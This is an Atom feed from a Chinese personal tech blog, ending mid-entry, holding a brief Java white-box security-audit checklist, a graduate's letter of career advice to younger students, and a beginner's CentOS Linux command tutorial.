<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>DV.K</title>
  
  
  <link href="http://blog.dvkunion.cn/atom.xml" rel="self"/>
  
  <link href="http://blog.dvkunion.cn/"/>
  <updated>2022-02-08T10:15:47.429Z</updated>
  <id>http://blog.dvkunion.cn/</id>
  
  <author>
    <name>DV.K</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>关于做渗透时在想些什么-白盒篇</title>
    <link href="http://blog.dvkunion.cn/2022/01/25/%E5%85%B3%E4%BA%8E%E5%81%9A%E6%B8%97%E9%80%8F%E6%97%B6%E5%9C%A8%E6%83%B3%E4%BA%9B%E4%BB%80%E4%B9%88-%E7%99%BD%E7%9B%92%E7%AF%87/"/>
    <id>http://blog.dvkunion.cn/2022/01/25/%E5%85%B3%E4%BA%8E%E5%81%9A%E6%B8%97%E9%80%8F%E6%97%B6%E5%9C%A8%E6%83%B3%E4%BA%9B%E4%BB%80%E4%B9%88-%E7%99%BD%E7%9B%92%E7%AF%87/</id>
    <published>2022-01-25T03:27:07.000Z</published>
    <updated>2022-02-08T10:15:47.429Z</updated>
    
    <content type="html"><![CDATA[<h1>关于做渗透时在想些什么-白盒篇</h1><h2>JAVA</h2><h3>1. 三方组件</h3><p>以maven项目为例，检查：</p><ul><li>pom引入了哪些组件？</li><li>mvn dependency:tree |grep 关键词/版本号 来快速检查三方包问题</li><li>哪些组件可能存在漏洞？（shiro/fastjson)</li><li>引入的三方组建是否在漏洞的版本内？</li></ul><h3>2. 安全配置</h3><p>以spring boot为例，检查：</p><ul><li>框架的配置是否符合安全预期？</li></ul><h3>3. 数据层（DAO)</h3><p>主要思考数据查询部分的</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;关于做渗透时在想些什么-白盒篇&lt;/h1&gt;
&lt;h2&gt;JAVA&lt;/h2&gt;
&lt;h3&gt;1. 三方组件&lt;/h3&gt;
&lt;p&gt;以maven项目为例，检查：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;pom引入了哪些组件？&lt;/li&gt;
&lt;li&gt;mvn dependency:tree |grep 关键词/版本</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>给学弟学妹的一封信</title>
    <link href="http://blog.dvkunion.cn/2020/06/22/%E7%BB%99%E5%AD%A6%E5%BC%9F%E5%AD%A6%E5%A6%B9%E7%9A%84%E4%B8%80%E5%B0%81%E4%BF%A1/"/>
    <id>http://blog.dvkunion.cn/2020/06/22/%E7%BB%99%E5%AD%A6%E5%BC%9F%E5%AD%A6%E5%A6%B9%E7%9A%84%E4%B8%80%E5%B0%81%E4%BF%A1/</id>
    <published>2020-06-22T12:09:12.000Z</published>
    <updated>2022-02-18T06:39:29.337Z</updated>
    
    <content type="html"><![CDATA[<h3><b>0x00 -- 序</b></h3><!-- split --><p>首先这篇文章可能会有点长，但是如果是你现在是大二、大三或者准大四的同学，并且正对未来处于一个迷茫的状态，你可以尝试耐住性子去读完剩下的部分。大一的同学有兴趣也可以看一下，没兴趣就关掉赶紧去享受你美好的大一生活（手动狗头）。</p><p>写这篇文章纯粹是因为突然意识到，已经2020年了，拿到了毕业证的我已经毕业了。由于今年的特殊原因，没有毕业典礼，也没有回校拍毕业照和参加最后的见面会，第二天还要继续上班工作，就像什么也没有发生一样，空空的总觉得缺少了一些仪式感。也是刚好想到最近有几个<b>学妹</b><del>(和学弟)</del>会和我咨询关于未来规划和工作的一些事情，所以想还是尽力去留下一些什么，也算是自己给自己做一个完结性质的毕业典礼吧。</p><p>希望能给大二大三以及准大四的学弟学妹们一些有用的帮助吧，虽然我也是咸鱼一条。｡ﾟヽ(ﾟ´Д`)ﾉﾟ｡</p><a id="more"></a><blockquote><p>P.S. 写完了之后我发现我的废话真的是很多，所以在这里加一个课代表的座位总结一下每个章节的重点，供后辈们有选择性的进行阅读，珍惜各位的时间。</p><ul><li><a href="#0x0A">0x01 我的大学四年生活详情</a></li><li><a href="#0x0B">0x02 大学四年期间的一些个人感悟和心得</a></li><li><a href="#0x0C">0x03  Q&amp;A 一些常见问题</a></li><li><a href="#0x0D">0x04 个人的一些建议</a></li><li><a href="#0x0F">0x05 祝福语</a></li></ul></blockquote><div id="0x0A"></div><h3><b>0x01 -- 我的四年</b></h3><p>现在想想四年的时间真的是过的很快，2016年刚入学校时候第一个感觉是略有失望，因为学校太小哈哈哈哈哈我总以为大学起码要大一点才能突显和高中的不同。其实总的来说我们学校地理位置还是很优越的，毕竟不是哪个学校都能紧挨着一个湖，离火车站一站地铁、市中心3站地铁的优越位置。╮(╯_╰)╭</p><p>大一刚入学，我是彻底的玩了一年，毕竟经过了恶心的高中终于解放了，所以大一基本没什么好说的，参加各种社团活动，各种团建，爽是真的爽，但是欠下的债总要还的。</p><p>到了大二才算是准备看一看自己能够做些什么了，大二也是我参加各种活动最多的一年。从参加蓝桥杯为契机，到参加电子设计竞赛，再到大创、数学建模、ACM区域赛(我太菜了都不好意讲出来)，直到最后的CTF竞赛。基本算是学校本院内能够参加的一些竞赛我都在这一年内去尝试了一遍(也就是尝试了一遍而已，基本都是成功参与(´Ａ｀。))。有好处也有坏处吧，好处是我就和逛菜市场一样转了一大圈最后才买到自己想要的萝卜，但总归是买到了，而且在这个过程中也学到了不少新鲜的东西。坏处就是浪费了整整一年的时间，才发现了自己喜欢和想要去做什么。</p><p>我一直是电子系专业的，但是实在是对各种电路打不起兴趣，也尝试去参加电子设计大赛试试能不能改观一下对这个专业的印象，然后并没有什么卵用，喜欢就是喜欢，不喜欢就是不喜欢。当时在大一结束也考虑不如直接就转专业去计算机系，然后纠结的考虑了很久之后觉得要重修的课比较多，同时还比较年轻，有自信觉得就算在电子系也能兼顾两边进行学习....(〒︿〒)我也不知道我哪来的自信(其实就是懒不想补课)。然后就错过了最佳的转专业的机会，到了大二专业课开课后就十分的难过了.....信号系统真不是人学的。(QAQ)</p><p>也是因为大二和学长(钱学长)交流之下，我确定了不去参加考研。当时的眼光还仅限于在学校之内，接触到、了解到的事物还仅限于学校之内。在大二升大三的暑假和学长的交流下才了解到出了校门之后，外界使用的一些技术、都有哪些工作、工作都是干些什么的。这也是当时学长给我的最好的建议，如果已经决定不考研的话，能尽早出来感受一下工作的分为就尽早感受，这样你能很快的了解到，互联网这个行业到底是一个什么样子的，而不是仅在学校这个像庇护所一样的圈子内一直坐着等着。</p><p>于是大三就是我走出舒适圈的一个转折点，因为不是计算机专业，计算机网络、Linux等等基础性的东西我都仅是一知半解，没有一个体系化的知识框架，再加上我个人的自制力比较差，自学可能就是三天打鱼两天晒网最后不了了之了，我报了一个外部的培训班，算是从宏观面上整体的对基础性的知识有一个体系化的学习和了解。同时也充分利用学校的资源，蹭了几节胡老师的计算机网络的课，也得到了不少的收获。</p><p>总的来说，大三是我在确定了自己的方向后，开始针对这个方向需要的一些技能和要求进行专业性的学习。也是最痛苦的还债的一年。基本上是周一周五先要照顾自己专业的课程，有空课去计算机系蹭一下课，周末两天要坐地铁到南大附近上课培训，基本是没有什么休息的时间了。晚上回来之后还要去更新笔记，如果有操作的一些东西尽量都要自己动手去操作一遍。这样度过了一个难熬的学期。</p><p>然后就到了大三的寒假，准备开始尝试投递简历找一份实习了。第一次投简历也是很愁人，怎么做简历、怎么找公司信息、怎么准备笔试面试...都没有做过，也不知道怎么去准备。也不知道自己的技能有没有符合招聘的标准、能不能胜任岗位的工作、会不会太菜了被面试官笑话等等等等...相对来说投简历的确会十分焦虑，每天期待着自己的邮箱多一个小红点，然后发现收到的邮件是：很抱歉，您不符合我们的岗位要求。心态直接炸裂......</p><p>但最终还是找到了一家在南京本地的实习机会。出来实习之后就真的发现，工作和学校里就有着很大的区别。基本上很少有时间来给你去进一步的沉淀自己的知识积累，工作就是把你以前所有积累的东西拿出来用一用了，你沉淀了多少东西，就能在工作中产生多大的价值。</p><p>也是因为有了这一段宝贵的实习经历，让我在后面的正式应届招聘里有了一张强力的底牌，也是最后我认为能拿到offer的关键一点。<b>所以如果你确定是不考研准备工作，那么务必！务必！要找一个有价值的实习工作。  </b></p><p>总的来说我的四年大学生活，其实真的就是只有三年，第一年用来娱乐享受；第二年参加各种竞赛，认识了各种各样有趣的人和朋友，参加到了计协大家庭，给了我很多前进的动力；第三年用来艰苦奋斗，开始为自己喜欢的事情做好充足的准备；第四年的时候就已经很少在学校了。</p><p>时间是真的过的很快的，我的大学四年也大概就是这个样子。</p><div id="0x0B"></div><h3><b>0x02 -- 个人心得</b></h3><p>如果说要让我来谈一下大学四年间生活的一些感悟和心得，那我觉得最重要的就是，<b>在大学期间加入了自己喜欢的圈子，认识了一群有趣的人。</b>我一直很感激能加入了计协，从一开始的C代码都写不好的菜鸡，被郭佬吉佬带到能称为计协技术部部长：计协有大一黝黑平头、满嘴火车炮但是认真教你写代码的郭佬(狗头)、陪我在机房一起熬到9点多的杜杜、一起准备比赛的吴同学、专业知识丰富的吉佬等等；也很感激在参与众多竞赛遇到的各路大神，像在数模认识的陆大佬、蒋神，他们的逻辑思维和数学能力给了我不少启发，还有我的数模队友，漂亮的写手李小姐姐、专业严谨的冯同学、以及提供给我不少工作经验的郑同学；以及在其他竞赛里遇到的在其他领域突出的一些大佬。在和大佬的交流和生活之中会不自然的被他们影响，朝着他们学习。所以我很感激通过各种方式能够认识这些优秀的人，从他们身上或多或少的学习到一些东西。</p><p>除此之外，我觉得在我大学生活中同样起到很大帮助的是和<b>正确的</b>老师多沟通。老师往往能给我们很多的经验和处理问题的方法，具有很高的参考价值。多和好老师<b>(纳姐)</b>多多沟通，听一听老师的建议往往对你迷惑的时候会很有帮助。</p><p>再要回想的话，也就是能感谢在大三坚持下来的自己吧。刚入门的时候真的是什么也不会、什么也做不出来。研究一个东西一星期最后什么结果也没有，能在这种绝望的情况下一次又一次的坚持下来，沉淀出到现在的一些东西，可能换做现在的我是已经做不到了的。</p><div id="0x0C"></div><h3><b>0x03 -- Q&amp;A 一些问题</b></h3><p><b><font color="red">Q：到底是应该考研还是工作？ </font></b></p><p><b>Me:</b> 这问题在大二暑假就很折磨我，我想一般处在这个时间节点的同学都有着这个问题，我到底是应该考研还是应该准备工作？还是应该着手两方面同时准备？</p><p>在大二之前，我是没有什么想法的，对社会上有哪些工作岗位、工作具体都是做些什么的都不了解，对考研也只有一个是升学的概念。眼看已经大二升大三了，准备考研的同学都开始准备要复习了，我却还没决定好到底是考研还是工作。然后就在一个偶然的机遇下和已经工作的学长聊了聊，给了我不少的启发，然后就奔向&quot;愉快&quot;的工作了。</p><p>至于我个人，我依旧是这个看法：考研和工作，应该取决于你到底想要做什么？考研能让你有一张更具有竞争力的王牌，能够让你在未来的竞争中能从大众的筛选线脱颖而出；同时考研给了你更多的缓冲期，你可以用更多的时间去积累、沉淀你的知识和技能。而工作，锻炼的更多的是你的综合能力。因为企业招聘应届生通常看中的更多是这个人的可塑性，所以更考察你接受新事物的能力、学习能力、以及和工作同事、上级的沟通能力、执行能力，最后还要求你的技能要能够符合岗位基本需求，相比考研更像是开始应用你这些年积攒下的知识财富。</p><p>通过对这两个不同路线的描述，你要考虑的是未来的你想要做一些什么？ 未来是想要进入大厂，在技能上做一些研究？还是想要接触最前端的技术，做一些人工智能、大数据分析等等听起来很上流的工作？还是准备搞科研，读博士，或者是就是想做一个码农，搞开发？根据你想要做的事情的不同，你要选择那条路也就一清二楚了。要说的是，这两条路没有什么好坏之分，没有什么哪一条比另一条会更好这一种说法，只要你能确认，你是因为自己想要做的事情需要我考研(或工作)，而不是因为跟随大家&quot;好多同学都考研(工作)了我也去考研吧(工作吧)&quot;这种想法，我觉得就没有任何问题。</p><p><b><font color="red">Q：计算机专业出身到底能做些什么事情？</font></b></p><p><b>Me:</b>说实话对于这个问题我只能以我现在的菜鸡视野来给你们解答，因为我也是一个刚入职场的小白。一般来说，互联网行业从服务对象上来分类分为甲方和乙方：甲方通常指提出需求的一方，而乙方就是来实现甲方爸爸需求的一方。按照这种分类，公司的职能体系也会有所不同，招聘的岗位也会有所不同。</p><p>技术岗位通常会比较偏向技术，需要有一定的专业技术能力，如开发岗，包含各种各样的语言开发：java、python、go、c++等等，岗位顾名思义就是进行产品代码开发；还有运维岗：这个岗位偏向IT技术一些，需要对电脑的常识和硬件有一定了解，日常负责维护机房、监控一些服务的运行状态等等。大一点的公司运维岗会分的很细，有专门负责网络的网络工程师、负责维护和监控服务器的运维工程师，负责数据库维护的DBA等等；再大一点的公司可能会有架构师的岗位，负责设计公司某个项目的整体框架：使用哪些技术栈、要用什么语言、什么协议进行通信，数据库的选型等等；除了这些之外还有很多很多的岗位：测试岗，测试开发岗、自动化岗位等等等等。很多公司还会按照自己的需求去招聘一些公司特有的岗位。</p><p>如果你还不知道自己想做什么，不妨去各大大型互联网公司的官方招聘网站上，看一下招聘的岗位和岗位需求描述。你能够很快的知道，大公司里面有什么样的岗位、使用什么样的技术，后面在学习的时候可以针对性的在这个方面进行研究学习。</p><p><b><font color="red">Q：XXX竞赛有价值吗？值得参加吗？</font></b></p><p><b>Me:</b> 如果你是一位大一或大二的同学，不论你提问的竞赛是什么，我都会告诉你，有价值！参与就完事了。但是如果你已经大三或步入大四了，那么我觉得你就要考虑一下，这个竞赛到底是做什么的，对我到底能不能起到一些帮助。因为在大一和大二，你是有大把的时间来进行不断地尝试，来遇见各式各样的人，竞赛会成为一个很好的平台来帮助你丰富完善你的大学生活；而大三大四你已经要开始为马上到来的远征准备冬粮，时间是十分宝贵的，你能在这个冬天存多少粮食，在未来的考研战场或是面试战场上你就有多少的底气去拼。所以每一个选择都要问一下自己，是否还需要这样做了。对于大三和大四的同学，我觉得不仅仅是要考虑竞赛这个问题，对于一些其他的活动，都应该以这样的一个角度去思考了。因为到了这个节点时间真的是很不够用了。以工作为例，大三上学期的寒假最好就可以去尝试投递简历、尝试找一份实习的工作，大三下的暑假就已经是秋招了。<b>千万不要以为秋招是大四暑假毕业才开始的!!!!!</b>而且很多大厂的秋招和春招都会有提前批，使你的准备时间更少。时间还是非常宝贵的。</p><p><b><font color="red">Q：怎么准备春招/秋招？</font></b></p><p><b>Me:</b> 首先准备春招/秋招，你需要一份简历。对自己没有那么足的自信的同学，我建议你需要一份自己的简历模板。什么意思呢？就是你需要按照不同公司对岗位的描述，来修改你的简历，有针对性的投递，这样成功率往往会成功很多；对自己经历和技能很满意的，也可以直接做一份通用式的简历，然后直接拿出来用就可以了。简历没有什么具体的要求，它类似于一份自我介绍，让对方企业以最快的方式了解你这个人。一般来说要包含你的个人信息、学校经历(觉得自己成绩不错的同学也可以在简历里提一下，突出你自己的优势)、实习或工作经历等。<b>简历很重要，往往后面的面试过程，面试官都是根据你的简历里面写的内容进行提问的，所以不要为了满足岗位要求而写了一堆虚假的信息。</b></p><p>一般来说 春招 是 秋招的一些补充，往往秋招没有招满的企业会继续在春招发布招聘启事，或事招聘一些实习岗位。<b>所以春招是寻找实习的最佳机会。</b>一般春招是从寒假的年后开始，2-3月份的样子，当然像腾讯阿里等等通常都会提前开启招聘通道，需要自己去关注。</p><p>秋招就是正式的应届招聘了，一般秋招在6-8月份开始，近些年出现的提前批等等导致其实在4月、5月就已经有一些秋招的信息了。这些招聘信息你可以在一些应届招聘的网站如：牛客网、实习僧等等找到统一的招聘启事，偶尔还有有内推的帖子；但最正规的途径还是去这个公司的官网。找到一个名称类似于人才招聘的链接，然后一般大厂都会有专门的校招页面。可以在这里面去寻找本年度该公司需要的人才。这样做同样也有一个好处：你的简历是直接推送到对方企业的，而不是经过那些第三方平台的存储，可以减少你个人信息泄漏的风险。</p><p>我当时的方法是：通过牛客网等等提供的统一招聘信息，知道了有哪些公司在进行招聘，然后通过谷歌去找到他们官网，在他们的官网获取到更详细的信息后进行投递。</p><p>春招秋招的大体流程都是差不多的，投递简历，等待简历筛选，通知笔试/面试，参加一面/二面/三面......最后如果都通过了进入HR面，和你谈论你的薪资定位以及公司的福利待遇，如果没什么问题就会给你发放offer进行签订，招聘的流程基本就完成了，剩下的就是等毕业后拿着毕业证、学位证去公司报道就可以了。</p><p>在投递简历的时候我个人的建议是：多尝试！不要怕失败，因为失败最多就是收不到回复邮件或是收到了拒绝邮件....(´Ａ｀。)多被拒绝几次就习惯了，但是对你个人来说是你自己的一次宝贵的经验！而且，说不定你多投递的这一家，丫就成功了呢？(,,・ω・,,)人如果没有梦想，那和咸鱼有什么区别？</p><p>最后放一张我当年投递简历做的表，真的是一段艰苦却很有价值的岁月。</p><p><img src="https://cdn.dvkunion.cn/WX20200630-152324%402x.png" class="lazyload" data-srcset="https://cdn.dvkunion.cn/WX20200630-152324%402x.png" srcset="/css/images/overlay.gif" alt="投递的一部分截图"></p><p>我暂时就想到这些问题，如果还有其他的问题，也可以在QQ上联系我，如果我知道的都会尽力去帮你解答。</p><div id="0x0D"></div><h3><b>0x04 -- 个人的一些建议</b></h3><p>(*´∀`)~♥其实说实话我不太喜欢给别人建议，因为我觉得每个人的情况都不相同，所以很多选择或是方法并不能对所有人都起到作用，而且我也不是什么很有价值的前辈，只是一个比你们早几年结束了学习生活和你们一样的菜鸡(╥﹏╥)。所以这一块大家也就是听听就好，觉得有用的话就参考一下下就可以。</p><p>首先是大学生活方面，一定不要浪费了大学的这四年生活，因为这是你去学习、去了解一些东西的最好的时间段，同时还有一群人能陪你一起去学习进步。等到工作或是读研之后，时间就变得十分紧迫了，接触和学习的范围也变得狭窄了，仅限于自己工作的内容或是研究的内容了。所以大学四年的时光一定要好好的珍惜。</p><p>其次是学习的一些方法，一定要做好沉淀和积累，可以是以笔记的形式，我个人更推荐已博客这种形式，提倡开源和分享精神。可以是一个小的知识点，也可以是一整块大的知识体系框架。在刚开始的时候可能没有什么感觉。等你坚持了一段时间你会发现，原来已经有了这么多的东西。同时这也是你复习和避免未来忘记的好帮手，我现在有些命令还需要查我以前的博客才能想起来怎么用......</p><p>最后是心态上的一些建议。大三那一年真的是忙碌的一年，上完专业课再去别的班级蹭课，周末再自己一个人做好几站的地铁去遥远的南大，和一群其他学校的陌生人一起听课。赶上投递的简历又总被pass，找不到工作，真的是精神很压抑的一阵。所以多和自己的小伙伴聊聊天，适当的也要学会自己缓解自己身上的压力，如果没法调节好自己的心态你会发现所有的事情都会变得越来越糟。和有可能你刚被上一个面试官嘲笑完，就要马上进行下一轮面试，你不能把刚才的情绪带到一段新的对话当中。抽时间可以去玄武湖走一走，转换一下心情，熬过去这一段最痛苦的时光就是柳暗花明。</p><div id="0x0F"></div><h3><b>0x05  -- 祝福语</b></h3><p>在离开学校的最后，留给学弟学妹们几句祝愿吧。</p><p>愿你们都能够学业有成，拿到自己想要学校或公司的offer。</p><p>愿你们都拥有似锦前程，在喜欢的未来做着自己喜欢的事情。</p><p>愿你们都怀着感恩之心，行程千里不忘恩师(纳姐)滴水之恩。♥(´∀` )人</p><p>愿你们都沐浴到幸运女神的眷属，在未来不要遇到太多的艰苦和歧途。</p><p>愿你们有一天都能与重要的人相逢。</p>]]></content>
    
    
    <summary type="html">&lt;h3&gt;&lt;b&gt;0x00 -- 序&lt;/b&gt;&lt;/h3&gt;
&lt;!-- split --&gt;
&lt;p&gt;首先这篇文章可能会有点长，但是如果是你现在是大二、大三或者准大四的同学，并且正对未来处于一个迷茫的状态，你可以尝试耐住性子去读完剩下的部分。大一的同学有兴趣也可以看一下，没兴趣就关掉赶紧去享受你美好的大一生活（手动狗头）。&lt;/p&gt;
&lt;p&gt;写这篇文章纯粹是因为突然意识到，已经2020年了，拿到了毕业证的我已经毕业了。由于今年的特殊原因，没有毕业典礼，也没有回校拍毕业照和参加最后的见面会，第二天还要继续上班工作，就像什么也没有发生一样，空空的总觉得缺少了一些仪式感。也是刚好想到最近有几个&lt;b&gt;学妹&lt;/b&gt;&lt;del&gt;(和学弟)&lt;/del&gt;会和我咨询关于未来规划和工作的一些事情，所以想还是尽力去留下一些什么，也算是自己给自己做一个完结性质的毕业典礼吧。&lt;/p&gt;
&lt;p&gt;希望能给大二大三以及准大四的学弟学妹们一些有用的帮助吧，虽然我也是咸鱼一条。｡ﾟヽ(ﾟ´Д`)ﾉﾟ｡&lt;/p&gt;</summary>
    
    
    
    <category term="Reading" scheme="http://blog.dvkunion.cn/categories/Reading/"/>
    
    
    <category term="MISC" scheme="http://blog.dvkunion.cn/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>Linux--CentOS</title>
    <link href="http://blog.dvkunion.cn/2019/12/02/Linux-CentOS/"/>
    <id>http://blog.dvkunion.cn/2019/12/02/Linux-CentOS/</id>
    <published>2019-12-02T06:41:48.000Z</published>
    <updated>2022-01-05T05:43:55.932Z</updated>
    
    <content type="html"><![CDATA[<h1>Linux--CentOS7.0</h1><hr><p>目录:</p><ul><li>0x00 前言</li><li>0x01 Linux简介</li><li>0x02 Linux简单命令</li><li>0x03 用户和权限管理</li><li>0x04 vim使用</li><li>0x05 网络配置</li></ul><h3><b>0x00- - 前言<b></b></b></h3><p>2018-12-20<br>趁着这一阶段系统性的把 Linux 的操作记录一下。<br>结合着 《鸟哥私房菜》 以及学习的知识进行一个系统性的总结。<br>关于 Linux，我目前的感受是----</p><ul><li>· 在没碰过Linux系统时，用Ubuntu桌面化都觉得：这是个什么鬼玩意？</li><li>· 用了一阵之后，记不住杂多命令的我：为什么会有人觉得这种东西会比图形化的win好？</li><li>· 习惯了以后：Linux 真香，来一口老弟，来一口。<br>总的来说Linux的管理和操作还是较清晰化和便捷的，至少对于我这种强迫症感觉文件的存放和分类都好清爽啊orz...</li></ul><p>2018-12-20<br>贴一个有趣的讲解：<br><a href="http://mp.weixin.qq.com/s?__biz=MzA4ODIwMDUyNw==&mid=2652994636&idx=2&sn=1f3b66c94de485c35b717c2295a196d5&chksm=8bf8186cbc8f917a241b0724dffb618547326cda89199d7a4b8cd14326f987b5189ba9335139&mpshare=1&scene=24&srcid=#rd" target="_blank" rel="noopener">有趣的命令</a><br><a href="http://mp.weixin.qq.com/s?__biz=MzA4ODIwMDUyNw==&mid=2652994485&idx=1&sn=7999fb43eca8f3c1eadb1a02475aa4b5&chksm=8bf81f95bc8f96831c00e6d780c06c104b8316fd8696d7134222850dc5ba1d2380d558e33774&mpshare=1&scene=24&srcid=#rd" target="_blank" rel="noopener">漫画讲解Linux内核</a></p><h3><b>0x01- - Linux简介<b></b></b></h3><p>首先简单的介绍一下Linux的发展历史，简单的...</p><p>Linux的前身是Unix老大哥。</p><p>在当时的年代，计算机是稀有的巨型资源，为了解决多用户，MIT在20世纪90年代开发了分时操作系统（CTSS），可以让大型主机通过提供多个终端（terminal）连入主机。这个系统在未来逐渐演化成了Multics。</p><p>在此之后，开发上述系统的人员中的Ken Thompson 在1969年开发出了Unix的原型，实现了Linux中最著名的一句话：万物皆文件。</p><p>1973:Unix正式诞生。这是基于C语言的第一个正式版本。</p><p>1993：Debian诞生</p><p>1994年3月，Linux1.0发布，代码量17万行，当时是按照完全自由免费的协议发布，随后正式采用GPL协议。</p><p>1996年6月，Linux 2.0内核发布，此内核有大约40万行代码，并可以支持多个处理器。此时的Linux 已经进入了实用阶段，全球大约有350万人使用。</p><p>2004：Ubuntu诞生--版本号采用年份+月份的格式（如04.10，即Ubuntu2004.10版本），每半年就发行一个版本，其中只有2006.04因为发行LTS（long term support）版本而进行了跳票。</p><p>Linux是开源的Unix系统，可免费使用和传播。</p><p>一般学习 Linux，都要多多少少的夹杂一些硬件和内核的知识。对于硬件知识总觉得有些无聊...这里记一下老师推荐的一本关于内核的书 《深入理解Linux内核》。希望自己在对于基本操作熟练了以后能够继续去深读与研究。</p><p>那么到底什么是Linux--我也说不出来，靠着万能的搜索引擎给出一组定义：Linux是一套免费使用和自由传播的类Unix操作系统，是一个基于POSIX和UNIX的多用户、多任务、支持多线程和多CPU的操作系统。Linux继承了Unix以网络为核心的设计思想，是一个性能稳定的多用户网络操作系统。</p><p>对于操作系统有一定了解的话，大致的将Linux可以看做是内核与系统调用的两层。对于不同架构的CPU，其功能函数也不相同。</p><p>因此，对于不同CPU内核架构，Linux可以分为：x86系列，i386系列,arm系列等等......</p><p>说到分类，在Linux中还存在着两个派系：Redhat的红帽系列和Ubuntu系列。对于这两者的区别：Ubuntu更适合新手，其桌面化的GUI模式对新手比较友好；而Redhat更多的应用于企业级服务器。<br>更多的来说，这二者的内核差距并不是很大，最大的区别也就是安装包的管理上，Ubuntu使用的是基于Debian的deb包，而Redhat使用的是自己研发的yum管理。</p><p><b>总结一下：</b></p><ol><li>1.Linux根据内核分类：i386,x86,arm;<br>根据distrabution分类：Redhat,Debian。</li><li>2.Linux的优点：开源免费，消耗资源少，安全性高等等。</li></ol><h3><b>0x02- - Linux 的简单操作<b></b></b></h3><p>打开一台Linux的机器，我们都需要做什么？或者是能够做什么呢？</p><p>贴一个关于Linux命令的网址：<a href="http://man.linuxde.net/" target="_blank" rel="noopener">http://man.linuxde.net/</a><br>同时也可以使用自带的手册：man+[your commoand]查看命令帮助。</p><p><b>几个快捷键</b>：</p><table><thead><tr><th style="text-align:left">快捷键组合</th><th style="text-align:left">功能</th></tr></thead><tbody><tr><td style="text-align:left">ctrl + shift + c</td><td style="text-align:left">鼠标选中后复制</td></tr><tr><td style="text-align:left">ctrl + shift + v</td><td style="text-align:left">鼠标选中后粘贴</td></tr><tr><td style="text-align:left">ctrl + shift + t</td><td style="text-align:left">打开另一个命令行窗口</td></tr><tr><td style="text-align:left">ctrl + c</td><td style="text-align:left">强制终止</td></tr><tr><td style="text-align:left">ctrl + d</td><td style="text-align:left">离开当前界面(EOF)</td></tr><tr><td style="text-align:left">alt + 窗口号</td><td style="text-align:left">在窗口之间切换</td></tr><tr><td style="text-align:left">ctrl + a</td><td style="text-align:left">光标跳转到命令行的行首</td></tr><tr><td style="text-align:left">ctrl + e</td><td style="text-align:left">光标跳转到命令行的行尾</td></tr><tr><td style="text-align:left">上下方向键</td><td style="text-align:left">历史命令</td></tr></tbody></table><p>熟悉了几个操作之后，我们打开终端：<br><img src="https://tva2.sinaimg.cn/large/006IjVYfgy1fydbmxztwnj30kg0bhwgb.jpg" class="lazyload" data-srcset="https://tva2.sinaimg.cn/large/006IjVYfgy1fydbmxztwnj30kg0bhwgb.jpg" srcset="/css/images/overlay.gif" alt=""><br>(1)最外围的方括号是固定的<br>(2)dvk表示当前登录操作系统的用户名<br>(3)@符号，固定格式<br>(4)localhost表示当前系统的FQDN名称的主机名部分<br>(5)~表示当前用户所在目录层级的位置<br>(6)$号，代表的是其他普通用户，如果是root，会变成#符号</p><p><b>清屏</b>：clear</p><p><b>查看自己当前所处位置</b>：pwd<br>pwd命令显示的是绝对路径：<br>(1)绝对路径：就是按照目录树的层次结构，从根目录依次往下写路径的方式<br>(2)相对路径：就是相对于当前位置的路径表达方式</p><p><b>获取主机名</b>：hostname<br>如何设置主机名<br>(1)临时设置主机名<br>hostname [yourname]<br>这样设置的主机名在重启后会被重置掉<br>(2)永久设置主机名<br>hostnamectl set-hostname [yourname]<br>或是修改文件 /etc/sysconfig/network<br>以及 /etc/hosts 两个文件可以实现。</p><p><b>路径目录切换</b>：cd</p><p>cd + 目标路径（绝对路径/相对路径写法）<br>cd - 返回上次所在路径<br>cd ~ 跳转到当前登录用户的家目录<br>cd .. 返回上一层</p><p><b>创建文件、文件夹</b>：<br>(1)创建一个目录（文件夹）<br>mkdir + 创建对象的路径（绝对路径/相对路径写法）<br>(2)创建一个普通文件<br>touch + 创建对象的路径（绝对路径/相对路径）<br>(3)删除一个目录（文件夹）<br>rmdir + 删除对象的路径（绝对路径/相对路径），弃之不用<br>rm -r + 删除对象的路径（绝对路径/相对路径）<br>rm -rf + 删除对象的路径（绝对路径/相对路径），表示强制递归删除<br>(4)删除一个普通文件<br>rm + 删除对象的路径（绝对路径/相对路径），可选用-rf参数</p><p><b>拷贝、粘贴、重命名</b>：<br>cp /root/anaconda-ks.cfg /root/Desktop/拷贝<br>cp /root/anaconda-ks.cfg /root/Desktop/xxx.txt拷贝的同时重命名<br>mv /root/Desktop/anaconda-ks.cfg /root/Desktop/yyy.txt重命名<br>/root/anaconda-ks.cfg /root/Desktop/剪切<br>mv /root/anaconda-ks.cfg /root/Desktop/xxx.txt剪切的同时重命名</p><p><b>查看目录下的文件</b>：<br>ls + [查看对象路径]  类似windows中的大图标方式查看，只看到文件名<br>ls -l [查看对象路径] 类似windows中详细信息方式查看，看到文件名，创建者等<br>ls -al [查看对象路径] 可看到对象路径下的所有文件<br>.表示当前路径<br>..表示上层路径</p><p><b>查看文件</b>：<br>cat /root/anaconda-ks.cfg一次性将对象内容读出<br>more /root/anaconda-ks.cfg查看对象的路径将对象内容读出，并逐屏展示，只能向下不能向上<br>less /root/anaconda-ks.cfg查看对象的路径将对象内容如初，并逐屏展示，可向上向下，q退出<br>tail /root/anaconda-ks.cfg<br>tail -n 5 /root/anaconda-ks.cfg<br>head /root/anaconda-ks.cfg   查看文件的头部，默认前十行<br>head -n 5 /root/anaconda-ks.cfg</p><p><b>显示时间</b>：date</p><p><b>日历</b>：cal</p><p><b>简要查询</b>：wahtis+[your command]</p><p><b>切换工作空间</b>：ctrl+F1-F6</p><h3><b>0x03- - 用户和权限管理<b></b></b></h3><p>Linux 支持多用户、多任务环境。</p><h4><font color="blue">用户</font><br></h4><p><b>创建用户</b><br>useradd + username<br>普通用户默认的家目录在/home/username<br>useradd -u 5000 username创建用户时指定用户的uid<br>useradd -g groupname username创建用户时同时指定用户的所属组<br>useradd -G groupname1,groupname2 username 创建用户时同时执行用户所属哪几个组</p><p><b>增加密码</b><br>passwd username</p><p><b>删除用户</b><br>userdel + username删除用户的登录信息（用户/密码）<br>这样会发现在home目录下依旧存留着删除用户的文件夹<br>userdel -r username彻底删除用户信息</p><p><b>创建用户组</b><br>groupadd + 